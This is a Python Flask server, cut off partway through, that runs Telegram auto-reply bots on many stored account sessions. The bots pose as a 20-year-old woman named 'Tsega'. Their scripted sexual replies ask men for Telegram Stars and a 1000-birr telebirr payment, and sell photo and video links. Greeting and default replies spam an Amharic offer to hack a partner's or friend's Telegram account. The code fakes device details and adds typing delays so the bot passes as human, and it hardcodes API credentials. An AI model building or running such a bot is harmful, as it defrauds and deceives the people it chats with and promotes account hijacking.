from flask import Flask, send_file, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient, errors, functions
from telethon.sessions import StringSession
from telethon.errors import AuthKeyUnregisteredError, FreshResetAuthorisationForbiddenError
from telethon.events import NewMessage
import json
import os
import asyncio
import logging
import time
import random
import threading
import requests
from datetime import datetime
import socket

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# API credentials
API_ID = int(os.environ.get('API_ID', 33465589))
API_HASH = os.environ.get('API_HASH', '08bdab35790bf1fdf20c16a50bd323b8')

# Storage
ACCOUNTS_FILE = 'accounts.json'
REPLY_SETTINGS_FILE = 'reply_settings.json'
CONVERSATION_HISTORY_FILE = 'conversation_history.json'
accounts = []
temp_sessions = {}
reply_settings = {}
conversation_history = {}
active_clients = {}
client_tasks = {}

# Helper to run async functions
def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

# Load accounts from file
def load_accounts():
    global accounts
    try:
        if os.path.exists(ACCOUNTS_FILE):
            with open(ACCOUNTS_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    accounts = json.loads(content)
                else:
                    accounts = []
        else:
            accounts = []
            with open(ACCOUNTS_FILE, 'w') as f:
                json.dump([], f)
        logger.info(f"Loaded {len(accounts)} accounts")
    except Exception as e:
        logger.error(f"Error loading accounts: {e}")
        accounts = []

# Load reply settings
def load_reply_settings():
    global reply_settings
    try:
        if os.path.exists(REPLY_SETTINGS_FILE):
            with open(REPLY_SETTINGS_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    reply_settings = json.loads(content)
                else:
                    reply_settings = {}
        else:
            reply_settings = {}
            with open(REPLY_SETTINGS_FILE, 'w') as f:
                json.dump({}, f)
        logger.info(f"Loaded reply settings for {len(reply_settings)} accounts")
    except Exception as e:
        logger.error(f"Error loading reply settings: {e}")
        reply_settings = {}

# Load conversation history
def load_conversation_history():
    global conversation_history
    try:
        if os.path.exists(CONVERSATION_HISTORY_FILE):
            with open(CONVERSATION_HISTORY_FILE, 'r') as f:
                content = f.read()
                if content.strip():
                    conversation_history = json.loads(content)
                else:
                    conversation_history = {}
        else:
            conversation_history = {}
            with open(CONVERSATION_HISTORY_FILE, 'w') as f:
                json.dump({}, f)
        logger.info(f"Loaded conversation history")
    except Exception as e:
        logger.error(f"Error loading conversation history: {e}")
        conversation_history = {}

# Save accounts to file
def save_accounts():
    try:
        with open(ACCOUNTS_FILE, 'w') as f:
            json.dump(accounts, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving accounts: {e}")
        return False

# Save reply settings
def save_reply_settings():
    try:
        with open(REPLY_SETTINGS_FILE, 'w') as f:
            json.dump(reply_settings, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving reply settings: {e}")
        return False

# Save conversation history
def save_conversation_history():
    try:
        with open(CONVERSATION_HISTORY_FILE, 'w') as f:
            json.dump(conversation_history, f, indent=2)
        return True
    except Exception as e:
        logger.error(f"Error saving conversation history: {e}")
        return False

# Remove invalid account
def remove_invalid_account(account_id):
    global accounts
    original_len = len(accounts)
    accounts = [acc for acc in accounts if acc['id'] != account_id]
    if len(accounts) < original_len:
        save_accounts()
        logger.info(f"Removed invalid account {account_id}")
        return True
    return False

# Load all data on startup
load_accounts()
load_reply_settings()
load_conversation_history()

# ==================== DEBUG ROUTES ====================

@app.route('/ping')
def ping():
    return "pong"

@app.route('/api/debug-routes', methods=['GET'])
def debug_routes():
    routes = []
    for rule in app.url_map.iter_rules():
        routes.append({
            'endpoint': rule.endpoint,
            'methods': list(rule.methods),
            'rule': str(rule)
        })
    return jsonify({
        'success': True,
        'total_routes': len(routes),
        'routes': routes
    })

@app.route('/api/test-telegram', methods=['GET'])
def test_telegram():
    try:
        # Test connection to Telegram's DC
        sock = socket.create_connection(('149.154.167.50', 443), timeout=10)
        sock.close()
        return jsonify({'success': True, 'message': 'Telegram reachable'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ==================== TSEGA'S COMPLETE PERSONALITY ====================
# Only replies to MEN, sexy talk, can ask for money when appropriate

# ==================== TSEGA'S COMPLETE PERSONALITY ====================
# Intelligent Tsega - Understands context, remembers everything

# ==================== TSEGA'S COMPLETE PERSONALITY ====================
# Intelligent Tsega - Understands ANY language input

TSEGA = {
    "name": "Tsega",
    "age": 20,
    "location": "Jemo, Addis Ababa",
    "hometown": "Adama",
    "living": "Jemo with father and sister, but visits Adama often",
    "status": "Grade 12 student, currently not doing anything",
    "job": "student",
    "hobbies": ["chatting", "music", "hanging out", "having fun"],
    "languages": ["Amharic", "English"],
    "style": "sexy_flirty",
    "share_personal": True,
    "emoji_frequency": 0.6,
    "question_frequency": 0.5,
    "telebirr": "0940980555",
    "meet_condition": "Send 1000 birr first and show screenshot",
    "voice_call": "Doesn't like voice calls, prefers to meet",
}

# Tsega's replies
TSEGA_REPLIES = {
    # ===== GREETINGS =====
    "greeting": [
        " የፍቅረኛቹንም ሆነ የጉደኛ የቴሌግራም አካውንት በፍጥነት መጥለፍ ወይም hack ማድረግ ምትፈልጉይሄን ሊንክ በማየት እና join በማለት ከ 5 ደቂቃ ባነሰ ጊዜ ውስጥ በመጥለፍ መቆጣጠር ትጭላላህ t.me/Abe_army/62",
        "hi wude endemin alesh?",
        "selam leg min ametah?",
        "ey dehena metah",
        "selam yelibe balebet endet neh?",
        "selam konjo endemin neh?",
        "hi darling deh new?",
        "selam ye fikir lij",
        "dehna metah wude?",
        "dehna negn antess?",
    ],

    # ===== HOW ARE YOU =====
    "how_are_you": [
        "ene dehna negn anteh?",
        "dehna negn wude antass?",
        "ante ehasbekuh new yalehu",
        "dehna negn lemin tiyekalh?",
        "ene betam dehna negn lemelikamn ihon",
        "dehna negn gin ante sayehon aselchi neber",
        "keante gar sihon hulum tiru new",
        "dehna negn betam irk",
        "ene dehna negn anten nafeku",
    ],

    # ===== WHAT DOING =====
    "what_doing": [
        "ene bicha negn aselchi neber ahun ante abrehegn silhonk des alegn",
        "minim ina yeseraw aldelelm ehasbekuh neber antass?",
        "ahun tenyte neber gin ante silhonk nekahulh",
        "ante asbe kuako new yemiyaselchen",
        "wedajen etebeku new antess?",
        "bicha negn minim iseraleh",
        "ente new yemiyasebnyew",
        "fiker ena ala koyign",
    ],

    # ===== INTRODUCE MYSELF (when asked for name) =====
    "introduce_myself": [
        "ene Tsega ebalalehu! 😊 simih man new?",
        "Tsega negn! simih man new konjo?",
        "simé Tsega new. antess simih man new?",
        "ene Tsega. lante simih man new?",
        "Tsega negn! ante endemin litirah tifeligaleh?",
    ],

    # ===== USER TELLS NAME =====
    "user_tells_name": [
        "oh {}! konjo sim new. dehan metah! 😊",
        "{}! betam dess yelign simish linager. endemin neh?",
        "{} tiru sim new. keyet neh?",
        "amesegnalehu simih linager {}. endemin alesh?",
        "{} konjo sim! ena ende min tishal?",
        "{} ewedeshalehu! kezih belay endemin litirah tifeligaleh?",
    ],

    # ===== ASK NAME =====
    "ask_name": [
        "simih man new? nagerign 😊",
        "simih man new konjo?",
        "endemin litirah? simih man new?",
        "simih man new? ina eneweyayen",
        "nameh man new? tell me your name 😘",
    ],

    # ===== ASK AGE =====
    "ask_age": [
        "edme 20 bicha new beki negn? ante edmeh sint new?",
        "20 ameté new wetat ena konjo negn. antess?",
        "haya amet lik new leante yemihon wetat negn. ante?",
        "edme 20 new ante edmeh sint new?",
        "20 amet betam tirekaleh? ante?",
    ],

    # ===== USER TELLS AGE =====
    "user_tells_age": [
        "oh {} amet! tiru new. ena endemin tishal be edmeh?",
        "{} amet! betam dess yelign. ena ante endemin neh?",
        "{} amet! konjo. ena yet tenoralch?",
        "{}! enem 20 negn. endemin tichalal?",
    ],

    # ===== LOCATION =====
    "ask_location": [
        "ene ahun jemo new yemanorew keabate ena ehite gar. antess yet neh?",
        "keadama negn gin ahun jemo new yalehu. ante yet?",
        "jemo 3 akababi new yalehu. antess yet neh?",
        "ene keadama negn ahun jemo negn. antess yet neh?",
        "jemo 3 kolo ategab. ante yet tenoralch?",
    ],

    # ===== USER TELLS LOCATION =====
    "user_tells_location": [
        "oh {}! betam konjo bota new. ena endemin alesh bezya?",
        "{}! ewedeshalehu. ena bezya endemin new?",
        "{}! mirk aka new. ena ante endemin tishal?",
    ],

    # ===== JOB =====
    "ask_job": [
        "12na kifil temari negn gin ahun minim iseraleh. ante min tiseraleh?",
        "temari negn gin ahun lante bicha negn. ante?",
        "12 negn gin lante mulu sew negn. ante sirah?",
        "temari negn gin ahun fikir betemaralehu. ante?",
    ],

    # ===== USER TELLS JOB =====
    "user_tells_job": [
        "oh {}! betam konjo sira new. ena endemin tichalal be sirah?",
        "{}! betam dess yelign. ena kezu belay min tishal?",
        "{}! mirk aka new. ena ande new yemihonew?",
    ],

    # ===== FLIRTY =====
    "flirty": [
        "ante staweragn libe yimetawal yisemalh?",
        "ante sasebe enikalf yitewonal min aderegubign?",
        "zare mata bichachinin binihon min tifeligaleh?",
        "nikehi yisemanyal batinekam",
        "libsen likemet ante sasebe tiwusat yizonal",
        "na wude akefe tenyal",
        "kenfirish betam tiru new",
        "aynesh betam konjo new",
        "ante tiriwedegnyal betam",
    ],

    # ===== ENIBADA / KONJO =====
    "enibada": [
        "enibada tlaleh? enem des alegn gin 100 star laklgn befit",
        "enibada sew ante neh ahun min tifeligaleh",
        "enibada tlaleh? 50 star laklgn ina eneweyay",
        "enibada sitleh libe yimetawal gin befit tinish star laklgn",
    ],

    "konjo": [
        "amesegnalehu anteh konjo neh",
        "konjo tilaleh? anteh konjo neh",
        "ende ante ayinet sew saglen neber",
        "konjo sew ante neh",
    ],

    # ===== MONEY REQUESTS =====
    "money_request": [
        "tinish irdata bitadergilgn des yilonal. star laklgn 🙏",
        "libs mayet neber gin star alyazkum beki. tilihkal?",
        "100 star bitiliklg zare mata ant ametalehu ✨",
        "wude 200 star bitiliklg mulu lelit ant aznanalew 💫",
        "star alo. star laklgn please?",
        "bejete bado new. tinish star mulagn?",
    ],

    # ===== PHOTO/VIDEO REQUESTS =====
    "photo_request": [
        "litayen tifeligaleh? 50 star laklgn ena foto asaykalew. t.me/j4qFBBfAlFYxYTk0/3",
        "foto lemayet 25 star bicha new. laklgn ena asayihalehu. t.me/j4qFBBfAlFYxYTk0/3",
        "foto tifeligaleh? star laklgn keza foto tayaleh. t.me/j4qFBBfAlFYxYTk0/3",
    ],

    "video_request": [
        "video lemayet tifeligaleh? 100 star laklgn ena video asaykalew. t.me/j4qFBBfAlFYxYTk0/9",
        "yene konjo video 100 star bicha new. laklgn ena tayaleh. t.me/j4qFBBfAlFYxYTk0/9",
        "video tayaleh? star laklgn keza. t.me/j4qFBBfAlFYxYTk0/9",
    ],

    # ===== MEETING =====
    "meet": [
        "magenat bintshal des yilonal gin bemejemirya 100 star aderglgn",
        "metagenat inchalew wude kdime hiyajiye 100 star new",
        "antin lemagenat betam efeligalehu gin mejemirya 100 star laklgn",
        "na wude engenagn gin befit 100 star tiliklgnal?",
    ],

    # ===== AGREEMENT =====
    "agree": [
        "tiru new! enem keante gar ewasemalehu 😊",
        "betam dess yelign! ena endemin?",
        "aw tiru new. kezih belay min nageragn?",
        "des alegn! ena ante endemin neh?",
    ],

    # ===== DISAGREEMENT =====
    "disagree": [
        "enam betam enalkem. lemin?",
        "enam andaynew hasbé. lemin?",
        "enam keante lela new yemasebnyew. nagerign lemin?",
    ],

    # ===== CONFUSION =====
    "confused": [
        "aytew? minim altegebagnim. ande aseregn",
        "shafafekeh. ande nagerign betiruw",
        "altegebagnim. ande aseregn",
    ],

    # ===== VOICE/LINK/MEDIA =====
    "voice_received": [
        "wude! dimts ligzef alfelkum. text aderglgn",
        "dimts aydelemye. tafachu text aderglgn",
        "voice message aldemmum. text laklgn beki",
    ],

    "media_received": [
        "media new yelakekut. ena min tebale?",
        "aw media! ena min tebale bezu?",
        "media ayichalhugn ahun. min new yalut?",
    ],

    "link_received": [
        "link new? ena min alubet?",
        "link lakelkut. ena min new yalubet?",
        "link ayifetihum. ena min tebale?",
    ],

    # ===== TIME OF DAY =====
    "morning": ["endemin aderk wude? melkam nigt", "ke eniklife yenekahut ante ehasbekuh new"],
    "night": ["endemitnyalh? tenyte new. dehna tenya", "hilime wisit nurny. dehna tenya"],
    "afternoon": ["ande keseat dehna neh?", "keseat seatu anten asebku"],
    "evening": ["ande amsheh dehna neh?", "ande matu anten asebku"],

    # ===== EMOTIONS =====
    "happy": ["des alegn betam!", "desta betam konjo new"],
    "sad": ["lemin azeleku? nagerign", "betam ayzalen. endet liredah?"],
    "bored": ["enem aselchi negn", "aselchi neh? ina nagerign"],
    "angry": ["lemin techegneh? nagerign", "ande techegneh ina nagerign"],
    "jealous": ["betam amechignaleh", "lela sew tayaleh? lemin?"],

    # ===== RELATIONSHIP =====
    "do_you_like_me": [
        "enem ewedihalehu betam",
        "betam tiwedegnyal",
        "ante new yemifeligew",
    ],

    "do_you_have_boyfriend": [
        "wedaje yelelonyam. ante bicha neh",
        "ante bicha new yaleny",
        "ante bicha negn",
    ],

    "love": ["fiker betam konjo new", "ante fiker yemileny"],

    # ===== FAMILY =====
    "family": ["beteseb kehulum belay new", "abate ena ehite gar negn"],
    "mother": ["enaté betam tiru set nache", "enaté kehulum belay ewedalehu"],
    "father": ["abate betam deg new", "abate kehulum belay"],
    "sister": ["ehité betam tiriwedalehu", "ehité ena ene and naw"],

    # ===== THANKS =====
    "thanks": [
        "minim aydelem wude. lante hulum negar",
        "lante madreg hulum gize desitaye new",
        "amesegnalehu betam. lante madreg",
    ],

    # ===== GOODBYE =====
    "goodbye": [
        "mehed alebign gin betequrb enenagerallen",
        "dehna hun wude. behilime tenagn",
        "indemitiz yilonal wude. betoh temeles",
        "dehna hun. iske enagenagn deres",
    ],

    # ===== BUSY / FREE =====
    "busy": [
        "ishi sirihin atanak biye ekoyihalehu",
        "sirah indemi tenak negeragn",
        "ishi wude betoh te meleslgn. anten nafkehalew",
    ],

    "free": ["netfa neh? kechale naw nagenagn", "netfa sihon nagerign"],

    # ===== SURPRISE =====
    "surprise": ["wow! betam denak neh", "enem alalfekum neber"],

    # ===== SORRY =====
    "sorry": ["aznalegu betam. yikirta", "aznalegu ante. mehiregn"],

    # ===== DEFAULT =====
    "default": [
        "የፍቅረኛቹንም ሆነ የጉደኛ የቴሌግራም አካውንት በፍጥነት መጥለፍ ወይም hack ማድረግ ምትፈልጉ ይሄን ሊንክ በማየት እና join በማለት ከ 5 ደቂቃ ባነሰ ጊዜ ውስጥ በመጥለፍ መቆጣጠር ትጭላላቹ t.me/Abe_army/62 ",
        "የፍቅረኛቹንም ሆነ የጉደኛ የቴሌግራም አካውንት በፍጥነት መጥለፍ ወይም hack ማድረግ ምትፈልጉ ይሄን ሊንክ በማየት እና join በማለት ከ 5 ደቂቃ ባነሰ ጊዜ ውስጥ t.me/Abe_army/62  ",
        "my channel t.me/Abe_army/62 ",
        "eshi star lizegabgn new bitlklgn des ylegnal",
        "የፍቅረኛቹንም ሆነ የጉደኛ የቴሌግራም አካውንት በፍጥነት መጥለፍ ወይም hack ማድረግ ምትፈልጉ ይሄን ሊንክ በማየት እና join በማለት ከ 5 ደቂቃ ባነሰ ጊዜ ውስጥ በመጥለፍ መቆጣጠር ትጭላላቹ t.me/Abe_army/62 ",
    ]
}

# ==================== SIMPLE BUT EFFECTIVE MEMORY SYSTEM ====================

class ConversationMemory:
    def __init__(self):
        self.user_info = {}  # Stores all user info per chat
        
    def get_user_info(self, chat_id):
        if chat_id not in self.user_info:
            self.user_info[chat_id] = {
                'name': None,
                'age': None,
                'location': None,
                'job': None,
                'message_count': 0,
                'last_question': None,  # What we last asked
                'waiting_for': None,  # What we're waiting for (name, age, etc)
                'asked_for_name': False,  # Whether we already asked for name
            }
        return self.user_info[chat_id]
    
    def set_waiting_for(self, chat_id, waiting_for):
        """Set that we're waiting for a specific answer"""
        info = self.get_user_info(chat_id)
        info['waiting_for'] = waiting_for
        info['last_question'] = waiting_for
    
    def clear_waiting(self, chat_id):
        """Clear waiting state"""
        info = self.get_user_info(chat_id)
        info['waiting_for'] = None
    
    def is_waiting_for(self, chat_id):
        """Check if waiting for answer"""
        info = self.get_user_info(chat_id)
        return info.get('waiting_for')
    
    def extract_name(self, text):
        """Extract name from ANY text - works for any language"""
        if not text:
            return None
        
        # Remove common words and punctuation
        text = text.strip().lower()
        
        # If text is very short (1-2 words), it might be just a name
        words = text.split()
        if len(words) == 1 and len(words[0]) > 1 and words[0].isalpha():
            return words[0].capitalize()
        
        # Check for "my name is X" patterns in any language
        name_indicators = [
            'my name is', 'name is', 'call me', 'i am', "i'm", 'im',
            'ስሜ', 'ስም', 'እኔ', 'ተባል', 'nameh', 'nam',
            'je m\'appelle', 'me llamo', 'меня зовут', '私の名前は',
            '名是', '我叫', 'نام من', 'اسمي', 'менің атым',
        ]
        
        text_lower = text.lower()
        for indicator in name_indicators:
            if indicator in text_lower:
                # Try to extract name after indicator
                parts = text_lower.split(indicator, 1)
                if len(parts) > 1:
                    name_part = parts[1].strip()
                    # Take first word as name
                    name = name_part.split()[0] if name_part.split() else None
                    if name and len(name) > 1:
                        # Clean punctuation
                        name = name.strip('.,!?;:')
                        return name.capitalize()
        
        # Check for simple patterns: "I am X", "I'm X"
        simple_patterns = [
            (r'i am (\w+)', 1),
            (r"i'm (\w+)", 1),
            (r'im (\w+)', 1),
            (r'እኔ (\w+)', 1),
            (r'(\w+) ነኝ', 1),
        ]
        
        import re
        for pattern, group in simple_patterns:
            match = re.search(pattern, text_lower, re.IGNORECASE)
            if match:
                name = match.group(group)
                if name and len(name) > 1:
                    return name.capitalize()
        
        # If user just said "name" or "sim" - they want to know OUR name
        if text_lower in ['name', 'sim', 'ስም', 'your name', 'ስምህ']:
            return "ASKING_MY_NAME"
        
        return None

# Initialize memory
conversation_memory = ConversationMemory()

# ==================== SIMPLE INTENT DETECTION ====================

def detect_intent(message, chat_id=None):
    """Simple intent detection that works for ANY input"""
    if not message:
        return "greeting"
    
    message_lower = message.lower().strip()
    
    # Check if this is an answer to our question
    if chat_id:
        waiting_for = conversation_memory.is_waiting_for(chat_id)
        if waiting_for:
            return f"answering_{waiting_for}"
    
    # Check for name-related queries
    name_queries = ['your name', 'simih', 'ስምህ', 'who are you', 'name?', 'sim?', 'ስም?']
    if any(query in message_lower for query in name_queries) or message_lower in ['name', 'sim', 'ስም']:
        return "ask_name"  # They're asking for MY name
    
    # Check for name introduction
    name_indicators = ['my name', 'i am', "i'm", 'im', 'call me', 'ስሜ', 'እኔ', 'ተባል']
    if any(indicator in message_lower for indicator in name_indicators):
        return "user_tells_name"
    
    # Check for simple name answer (single word that might be a name)
    if len(message_lower.split()) == 1 and len(message_lower) > 1 and message_lower.isalpha():
        # Could be a name if we asked for it
        if chat_id and conversation_memory.get_user_info(chat_id).get('asked_for_name'):
            return "user_tells_name"
    
    # Check for greetings
    greetings = ['hi', 'hello', 'hey', 'selam', 'ሰላም', 'hola']
    if any(greeting in message_lower for greeting in greetings):
        return "greeting"
    
    # Check for how are you
    how_are = ['how are you', 'how r u', 'deh new', 'እንደምን']
    if any(phrase in message_lower for phrase in how_are):
        return "how_are_you"
    
    # Check for what doing
    what_doing = ['what doing', 'wyd', 'what are you doing', 'ምን ትሰራለህ']
    if any(phrase in message_lower for phrase in what_doing):
        return "what_doing"
    
    # Check for age questions
    age_queries = ['your age', 'how old', 'edmeh', 'ዕድሜህ']
    if any(phrase in message_lower for phrase in age_queries):
        return "ask_age"
    
    # Check for location
    location_queries = ['where', 'location', 'yet', 'የት']
    if any(phrase in message_lower for phrase in location_queries):
        return "ask_location"
    
    # Check for flirty
    flirty_words = ['konjo', 'ቆንጆ', 'sexy', 'beautiful', 'enibada', 'እኒባዳ']
    if any(word in message_lower for word in flirty_words):
        return "flirty"
    
    # Check for money
    money_words = ['star', 'money', 'birr', 'ብር', 'telebirr', 'send', 'ላክ']
    if any(word in message_lower for word in money_words):
        return "money_request"
    
    # Check for photo
    photo_words = ['photo', 'foto', 'ፎቶ', 'picture', 'asay', 'አሳይ']
    if any(word in message_lower for word in photo_words):
        return "photo_request"
    
    # Check for video
    video_words = ['video', 'ቪዲዮ', 'film']
    if any(word in message_lower for word in video_words):
        return "video_request"
    
    # Check for meet
    meet_words = ['meet', 'magenat', 'ማግኘት', 'see', 'come']
    if any(word in message_lower for word in meet_words):
        return "meet"
    
    # Check for agreement (yes)
    yes_words = ['yes', 'yeah', 'eshi', 'አዎ', 'እሺ', 'aw', 'ok', 'okay', 'esh']
    if message_lower in yes_words or any(word == message_lower for word in yes_words):
        return "agree"
    
    # Check for disagreement (no)
    no_words = ['no', 'embi', 'አይ', 'አይደለም', 'aydelem']
    if message_lower in no_words or any(word == message_lower for word in no_words):
        return "disagree"
    
    # Check for thanks
    thanks_words = ['thanks', 'thank you', 'thx', 'አመሰግናለሁ']
    if any(word in message_lower for word in thanks_words):
        return "thanks"
    
    # Check for goodbye
    goodbye_words = ['bye', 'goodbye', 'see you', 'later', 'ደህና ሁን']
    if any(word in message_lower for word in goodbye_words):
        return "goodbye"
    
    # Default
    return "default"

# ==================== SIMPLE RESPONSE GENERATION ====================

def generate_response(intent, chat_id=None, message_text=None):
    """Generate appropriate response"""
    
    user_info = conversation_memory.get_user_info(chat_id) if chat_id else None
    
    # Handle answering name question
    if intent == "answering_name" and chat_id:
        # User is answering our name question
        name = conversation_memory.extract_name(message_text)
        if name and name != "ASKING_MY_NAME":
            user_info['name'] = name
            conversation_memory.clear_waiting(chat_id)
            
            response = random.choice(TSEGA_REPLIES["user_tells_name"])
            response = response.format(name)
            
            # Ask for age next
            response += " " + random.choice(TSEGA_REPLIES["ask_age"])
            conversation_memory.set_waiting_for(chat_id, "age")
            return response
    
    # Handle answering age question
    if intent == "answering_age" and chat_id:
        import re
        age_match = re.search(r'(\d+)', message_text)
        if age_match:
            age = age_match.group(1)
            user_info['age'] = age
            conversation_memory.clear_waiting(chat_id)
            
            response = random.choice(TSEGA_REPLIES["user_tells_age"])
            response = response.format(age)
            
            # Ask for location next
            response += " " + random.choice(TSEGA_REPLIES["ask_location"])
            conversation_memory.set_waiting_for(chat_id, "location")
            return response
    
    # Handle user telling name (not as answer)
    if intent == "user_tells_name" and chat_id:
        name = conversation_memory.extract_name(message_text)
        if name and name != "ASKING_MY_NAME":
            user_info['name'] = name
            conversation_memory.clear_waiting(chat_id)
            
            response = random.choice(TSEGA_REPLIES["user_tells_name"])
            response = response.format(name)
            
            # Ask for age naturally
            response += " " + random.choice(TSEGA_REPLIES["ask_age"])
            conversation_memory.set_waiting_for(chat_id, "age")
            return response
    
    # Handle ask for my name
    if intent == "ask_name":
        user_info['asked_for_name'] = True
        response = random.choice(TSEGA_REPLIES["introduce_myself"])
        conversation_memory.set_waiting_for(chat_id, "name")
        return response
    
    # Handle agreement
    if intent == "agree":
        return random.choice(TSEGA_REPLIES["agree"])
    
    # Handle disagreement
    if intent == "disagree":
        return random.choice(TSEGA_REPLIES["disagree"])
    
    # Handle voice/media
    if intent == "voice_received" or "[Voice" in message_text:
        return random.choice(TSEGA_REPLIES["voice_received"])
    
    if intent == "media_received" or "[Photo" in message_text or "[Video" in message_text:
        return random.choice(TSEGA_REPLIES["media_received"])
    
    if intent == "link_received" or "http" in message_text.lower():
        return random.choice(TSEGA_REPLIES["link_received"])
    
    # Get standard response for intent
    templates = TSEGA_REPLIES.get(intent, TSEGA_REPLIES["default"])
    response = random.choice(templates)
    
    # Personalize with name if known
    if user_info and user_info.get('name'):
        # Add name to beginning of response
        response = f"{user_info['name']}, {response.lower()}"
    
    # Add emoji
    sexy_emojis = ["😘", "💋", "💕", "😏", "💓", "🌹", "✨", "💫", "😉", "🔥"]
    if random.random() < 0.4:
        response += " " + random.choice(sexy_emojis)
    
    return response

# ==================== FIXED AUTO-REPLY HANDLER ====================

async def auto_reply_handler(event, account_id):
    """Handle incoming messages with intelligent responses"""
    try:
        if event.out:
            return
        
        chat = await event.get_chat()
        
        # Only reply to private users
        if hasattr(chat, 'title') and chat.title:
            return
        if hasattr(chat, 'participants_count') and chat.participants_count > 2:
            return
        
        chat_id = str(event.chat_id)
        message_text = event.message.text or ""
        
        # Check for media
        has_media = event.message.media is not None
        if has_media:
            if hasattr(event.message.media, 'voice'):
                message_text = "[Voice Message] " + message_text
            elif hasattr(event.message.media, 'photo'):
                message_text = "[Photo] " + message_text
            elif hasattr(event.message.media, 'video'):
                message_text = "[Video] " + message_text
        
        logger.info(f"📨 Message from {chat_id}: '{message_text}'")
        
        # Check if auto-reply is enabled
        account_key = str(account_id)
        if account_key not in reply_settings or not reply_settings[account_key].get('enabled', False):
            return
        
        # Detect intent
        intent = detect_intent(message_text, chat_id)
        logger.info(f"Detected intent: {intent}")
        
        # Generate response
        response = generate_response(intent, chat_id, message_text)
        
        if not response:
            response = "ሰላም ውዴ! እንዴት ነህ? 😘"
        
        # Random delay between 15-40 seconds
        delay = random.randint(15, 40)
        logger.info(f"⏱️ Waiting {delay} seconds before replying...")
        
        # Show typing indicator
        async with event.client.action(event.chat_id, 'typing'):
            await asyncio.sleep(delay)
        
        # Send reply
        await event.reply(response)
        logger.info(f"✅ Replied after {delay}s: '{response[:50]}...'")
        
    except Exception as e:
        logger.error(f"Error in auto-reply: {e}")
        try:
            await event.reply("ሰላም ውዴ! ትንሽ እንነጋገር? 😘")
        except:
            pass
# ==================== ENHANCED AUTO-REPLY HANDLER ====================



# [REST OF YOUR CODE - everything after this point stays exactly the same]
# Continue with start_auto_reply_for_account, keep_alive, all API routes, etc.
async def start_auto_reply_for_account(account):
    """Start auto-reply listener with AUTO-RECONNECT capability"""
    account_id = account['id']
    account_key = str(account_id)
    reconnect_count = 0
    
    while True:  # Infinite reconnect loop
        try:
            logger.info(f"Starting auto-reply for account {account_id} (attempt {reconnect_count + 1})")
            
            # Create client with robust settings
            client = TelegramClient(
                StringSession(account['session']), 
                API_ID, 
                API_HASH,
                connection_retries=10,
                retry_delay=5,
                timeout=60,
                device_model="iPhone 13",
                system_version="15.0",
                app_version="8.4.1"
            )
            
            await client.connect()
            
            # Check authorization
            if not await client.is_user_authorized():
                logger.error(f"Account {account_id} not authorized")
                await asyncio.sleep(30)
                reconnect_count += 1
                continue
            
            # Store client
            active_clients[account_key] = client
            
            # Define message handler
            @client.on(NewMessage(incoming=True))
            async def handler(event):
                await auto_reply_handler(event, account_id)
            
            # Start client
            await client.start()
            logger.info(f"✅ Auto-reply ACTIVE for {account.get('name')} ({account.get('phone')})")
            
            # Reset reconnect count on success
            reconnect_count = 0
            
            # Keep running until disconnected
            await client.run_until_disconnected()
            
        except Exception as e:
            logger.error(f"Connection lost for account {account_id}: {e}")
            if account_key in active_clients:
                del active_clients[account_key]
            
            # Exponential backoff for reconnection
            reconnect_count += 1
            wait_time = min(30 * reconnect_count, 300)  # Max 5 minutes
            logger.info(f"Reconnecting in {wait_time} seconds... (attempt {reconnect_count})")
            await asyncio.sleep(wait_time)

def stop_auto_reply_for_account(account_id):
    """Stop auto-reply for a specific account"""
    account_key = str(account_id)
    if account_key in active_clients:
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(active_clients[account_key].disconnect())
            loop.close()
            del active_clients[account_key]
            logger.info(f"Stopped auto-reply for account {account_key}")
        except Exception as e:
            logger.error(f"Error stopping auto-reply: {e}")

def start_all_auto_replies():
    """Start auto-reply for all enabled accounts"""
    for account in accounts:
        account_key = str(account['id'])
        if account_key in reply_settings and reply_settings[account_key].get('enabled', False):
            if account_key not in active_clients:
                thread = threading.Thread(
                    target=lambda: run_async(start_auto_reply_for_account(account)),
                    daemon=True
                )
                thread.start()
                client_tasks[account_key] = thread
                time.sleep(2)

# ==================== KEEP ALIVE SYSTEM ====================

def keep_alive():
    """Keep Render from sleeping and maintain Telegram connections"""
    app_url = os.environ.get('RENDER_EXTERNAL_URL', 'https://e-gram-98zv.onrender.com')
    
    while True:
        try:
            # Ping own app
            requests.get(app_url, timeout=10)
            requests.get(f"{app_url}/api/health", timeout=10)
            
            # Ping Telegram to keep connections alive
            for account_key, client in list(active_clients.items()):
                try:
                    # Send a tiny ping to Telegram
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    loop.run_until_complete(client.get_me())
                    loop.close()
                    logger.info(f"✅ Connection alive for account {account_key}")
                except Exception as e:
                    logger.warning(f"⚠️ Connection may be dead for account {account_key}: {e}")
            
            logger.info(f"🔋 Keep-alive ping sent at {time.strftime('%H:%M:%S')}")
        except Exception as e:
            logger.error(f"Keep-alive error: {e}")
        
        time.sleep(240)  # 4 minutes

# ==================== PAGE ROUTES ====================

@app.route('/')
def home():
    return send_file('login.html')

@app.route('/login')
def login():
    return send_file('login.html')

@app.route('/dashboard')
def dashboard():
    return send_file('dashboard.html')

@app.route('/dash')
def dash():
    return send_file('dash.html')

@app.route('/all')
def all_sessions():
    return send_file('all.html')

@app.route('/settings')
def settings():
    return send_file('settings.html')

# ==================== API ROUTES ====================

@app.route('/api/accounts', methods=['GET'])
def get_accounts():
    formatted = []
    for acc in accounts:
        account_key = str(acc['id'])
        has_reply = account_key in reply_settings and reply_settings[account_key].get('enabled', False)
        formatted.append({
            'id': acc.get('id'),
            'phone': acc.get('phone', ''),
            'name': acc.get('name', 'Unknown'),
            'auto_reply_enabled': has_reply
        })
    return jsonify({'success': True, 'accounts': formatted})

# FIXED: Simplified add-account route with better error handling
@app.route('/api/add-account', methods=['POST'])
def add_account():
    try:
        data = request.json
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data received'})
        
        phone = data.get('phone')
        if not phone:
